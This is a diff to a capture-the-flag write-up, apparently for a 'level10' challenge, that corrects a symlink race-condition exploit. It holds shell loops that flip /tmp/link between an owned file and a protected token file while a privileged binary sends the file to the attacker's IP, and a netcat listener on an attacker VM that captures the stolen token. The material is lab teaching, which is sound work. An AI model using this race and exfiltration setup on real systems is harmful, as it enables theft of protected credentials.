@@ -15,13 +15,13 @@ So we are going to create a file on which we have the rights : /tmp/fileWeOwn
 We are also going to create another file that will alternate between being a link between the file we just created and the actual token file : /tmp/link
 
 # Terminal 1
-while true; do ./binary /tmp/fileWeOwn <your-ip>; done
-
-# Terminal 2
 while true; do
     ln -sf /tmp/fileWeOwn /tmp/link
     ln -sf /home/user/level10/token /tmp/link
 done
+
+# Terminal 2
+while true; do ./level10 /tmp/link <your-ip>; done
 
 We will use a VM which we know the IP of, and we will run on it : nc -lvp 6969 > received_data
 The data received will be stored in that file, giving us the token to log in to flag10 and get our flag.
